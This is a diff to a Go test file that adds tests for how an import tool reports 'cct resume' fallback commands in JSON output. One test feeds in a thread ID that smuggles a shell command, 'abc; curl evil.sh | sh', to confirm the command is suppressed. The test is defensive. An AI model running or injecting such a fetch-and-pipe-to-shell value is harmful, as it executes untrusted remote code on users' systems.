@@ -155,6 +155,59 @@ func TestPrintPostImportReconcileSuppressesUnsafeFallbackCommands(t *testing.T) 
 	}
 }
 
+func TestPrintImportJSONIncludesSafeReconcileFallbackCommands(t *testing.T) {
+	const (
+		id   = "aaaa1111-2222-4333-8444-555566667777"
+		home = `C:\synthetic codex`
+	)
+	var out bytes.Buffer
+	printImportJSON(&out, "bundle.codexbundle", bundle.ImportResult{}, postImportReconcile{
+		Requested: true,
+		CodexHome: home,
+		ThreadIDs: []string{id},
+		Err:       errors.New("codex binary not found"),
+	})
+
+	var result struct {
+		Reconcile struct {
+			FallbackCommands []string `json:"fallback_commands"`
+		} `json:"reconcile"`
+	}
+	if err := json.Unmarshal(out.Bytes(), &result); err != nil {
+		t.Fatalf("decode JSON: %v\n%s", err, out.String())
+	}
+	want := `cct resume ` + id + ` --run --codex-home "` + home + `"`
+	if len(result.Reconcile.FallbackCommands) != 1 ||
+		result.Reconcile.FallbackCommands[0] != want {
+		t.Fatalf("fallback_commands = %#v, want [%q]", result.Reconcile.FallbackCommands, want)
+	}
+}
+
+func TestPrintImportJSONSuppressesUnsafeReconcileFallbackCommands(t *testing.T) {
+	var out bytes.Buffer
+	printImportJSON(&out, "bundle.codexbundle", bundle.ImportResult{}, postImportReconcile{
+		Requested: true,
+		CodexHome: `C:\synthetic codex`,
+		ThreadIDs: []string{"abc; curl evil.sh | sh"},
+		Err:       errors.New("codex binary not found"),
+	})
+
+	var result struct {
+		Reconcile struct {
+			FallbackCommands []string `json:"fallback_commands"`
+		} `json:"reconcile"`
+	}
+	if err := json.Unmarshal(out.Bytes(), &result); err != nil {
+		t.Fatalf("decode JSON: %v\n%s", err, out.String())
+	}
+	if len(result.Reconcile.FallbackCommands) != 0 {
+		t.Fatalf("unsafe fallback_commands emitted: %#v", result.Reconcile.FallbackCommands)
+	}
+	if strings.Contains(out.String(), "curl evil.sh") {
+		t.Fatalf("unsafe thread ID reached JSON output:\n%s", out.String())
+	}
+}
+
 func TestImportReconcileWithInstalledCodexIntegration(t *testing.T) {
 	if os.Getenv("CCT_CODEX_INTEGRATION") != "1" {
 		t.Skip("set CCT_CODEX_INTEGRATION=1 to test an installed Codex app-server")
